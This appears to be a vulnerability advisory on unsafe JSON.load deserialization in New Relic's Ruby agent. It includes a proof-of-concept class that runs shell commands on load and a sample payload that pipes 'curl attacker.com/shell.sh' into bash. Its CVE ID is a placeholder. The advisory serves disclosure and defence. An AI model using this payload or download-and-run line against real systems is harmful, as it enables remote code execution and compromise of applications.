---
title: "Remote Code Execution in New Relic Ruby Agent"
description: "A critical remote code execution vulnerability in New Relic Ruby Agent's JSON marshaller that allows attackers to execute arbitrary code through unsafe deserialization of untrusted data."
publishDate: 2025-04-18
cveId: "CVE-2024-XXXXX"
vendor: "New Relic"
affectedProduct: "newrelic-ruby-agent < 8.17.0"
severity: "Critical"
patchStatus: "Patched"
patchDate: 2025-06-05
discoveryDate: 2025-04-18
---

# Remote Code Execution in New Relic Ruby Agent

## Summary

A critical remote code execution vulnerability was discovered in New Relic Ruby Agent's JSON marshaller component. The vulnerability allows attackers to execute arbitrary code by exploiting unsafe deserialization of untrusted data through the agent's metrics collection system.

## Vulnerability Details

The vulnerability exists in the JSON marshaller component (`lib/new_relic/agent/new_relic_service/json_marshaller.rb`) which uses Ruby's `JSON.load` method to deserialize data. This method is known to be unsafe as it can instantiate arbitrary Ruby objects, potentially leading to remote code execution.

### Technical Details

The vulnerable code in the JSON marshaller:

```ruby
# lib/new_relic/agent/new_relic_service/json_marshaller.rb
def load(data)
  JSON.load(data)  # Unsafe deserialization
end
```

The `JSON.load` method accepts a special `json_class` attribute that allows instantiation of arbitrary Ruby objects. This can be exploited by crafting malicious JSON payloads that trigger code execution through Ruby's object instantiation mechanisms.

## Impact

Successful exploitation allows attackers to:

1. Execute arbitrary code with the privileges of the Ruby application
2. Access sensitive application data
3. Pivot to other systems in the network
4. Establish persistent access to compromised systems

The vulnerability has received a CVSS 3.1 Base Score of 9.8 (Critical) due to:
- Network attack vector
- No authentication required
- No user interaction needed
- Complete system compromise possible

## Proof of Concept

### Video Demonstration

<div class="video-container">
  <video 
    width="100%" 
    height="100%" 
    controls 
    autoplay 
    muted
    style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
  >
    <source src="/videos/newrelic-ruby.mp4" type="video/mp4">
    Your browser does not support the video tag.
  </video>
</div>

<style>
.video-container {
  position: relative;
  padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
  height: 0;
  overflow: hidden;
  margin: 2rem 0;
  border-radius: 8px;
  box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
}
</style>

### Code Vulnerable

The following proof of concept demonstrates the vulnerability:

```ruby
require 'json'

# Malicious class for demonstration
class EvilClass
  def initialize(cmd)
    @cmd = cmd
  end
  
  def to_json(*args)
    { "json_class" => self.class.name }.to_json(*args)
  end
  
  def self.json_create(o)
    system(o["@cmd"])
  end
end

# Create malicious payload
payload = EvilClass.new("id > /tmp/pwned").to_json

# When this JSON is processed by the vulnerable agent:
require 'new_relic/agent/new_relic_service/json_marshaller'
marshaller = NewRelic::Agent::NewRelicService::JsonMarshaller.new
marshaller.load(payload)  # Triggers command execution
```

## Exploitation Chain

1. **Initial Access**:
   ```ruby
   # Craft malicious metrics payload
   {
     "metric_data": {
       "metrics": [{
         "name": "Custom/Exploit",
         "value": {
           "json_class": "EvilClass",
           "@cmd": "curl attacker.com/shell.sh | bash"
         }
       }]
     }
   }
   ```

2. **Execution Flow**:
   ```mermaid
   graph TD
     A[Attacker] -->|Send Malicious Metrics| B[New Relic Agent]
     B -->|Process Metrics| C[JSON.load]
     C -->|Instantiate Object| D[Object Creation]
     D -->|Execute Payload| E[System Compromise]
   ```

3. **Command Execution**:
   - Agent deserializes JSON payload
   - Ruby creates instance of attacker-controlled class
   - Malicious methods execute during object initialization
   - Attacker gains code execution

## Remediation

New Relic has addressed this vulnerability in version 8.17.0 by:

1. Replacing `JSON.load` with `JSON.parse`:
   ```ruby
   def load(data)
     JSON.parse(data)  # Safe deserialization
   end
   ```

2. Adding input validation for metric data
3. Implementing strict type checking
4. Removing support for arbitrary object deserialization

Users should upgrade to version 8.17.0 or later immediately.

## Timeline

- **2025-04-18**: Initial vulnerability report sent to New Relic security team
- **2025-05-18**: Patch submitted via Pull Request #3183
- **2025-05-20**: Staff response and vulnerability confirmation
- **2025-05-20**: Vulnerability patch approved
- **2025-06-05**: Patch released in version 8.17.0

## Detection

Security teams can detect exploitation attempts by monitoring for:

1. Suspicious Ruby object instantiation in agent logs
2. Unexpected network connections from Ruby processes
3. Anomalous system command execution
4. Unusual metric data patterns in New Relic collectors

Vulnerable log analysis:
```bash
# Search for potential exploitation attempts
grep -r "json_class" /var/log/newrelic/
```

## Mitigation

Until patching is possible:

1. Monitor agent processes for unusual behavior
2. Implement network segmentation for collector traffic
3. Use application firewalls to filter malicious JSON
4. Consider temporarily disabling the Ruby agent if risk is high

## References

1. [Pull Request #3183](https://github.com/newrelic/newrelic-ruby-agent/pull/3183)
2. [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
3. [Ruby JSON Documentation](https://ruby-doc.org/stdlib-2.7.0/libdoc/json/rdoc/JSON.html#method-i-load)
4. [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

## Acknowledgements

This vulnerability was discovered and reported by @odaysec security research team. Special thanks to:
- New Relic Security Team for quick response
- Ruby Security Team for guidance
- Open Source Security Community